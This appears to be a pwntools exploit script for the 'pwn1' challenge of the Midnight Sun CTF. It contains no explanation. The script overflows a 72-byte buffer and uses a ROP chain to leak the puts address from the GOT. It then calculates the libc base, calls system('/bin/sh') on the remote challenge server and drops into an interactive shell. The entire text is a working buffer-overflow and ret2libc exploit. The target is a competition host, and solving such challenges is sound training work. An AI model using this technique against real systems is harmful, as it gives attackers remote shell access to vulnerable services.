from pwn import *

elf = context.binary = ELF("./pwn1")

#r = process(elf.path)
r = remote("pwn1-01.play.midnightsunctf.se", 10001)

elf_rop = ROP(elf)
elf_rop.puts(elf.got["puts"])
elf_rop.call(0x00400698)

payload = ""
payload += "A" * 72
payload += str(elf_rop)
r.sendlineafter("buffer: ", payload)

puts_leak = u64(r.recvline().rstrip().ljust(8, "\x00"))
log.info("puts leak: {}".format(hex(puts_leak)))

libc = ELF("./libc.so.6")
libc.address = puts_leak - libc.symbols["puts"]

libc_rop = ROP(libc)
libc_rop.raw(elf_rop.find_gadget(["ret"]))
libc_rop.system(next(libc.search("/bin/sh\x00")))

payload = ""
payload += "A" * 72
payload += str(libc_rop)
r.sendlineafter("buffer: ", payload)

r.interactive()
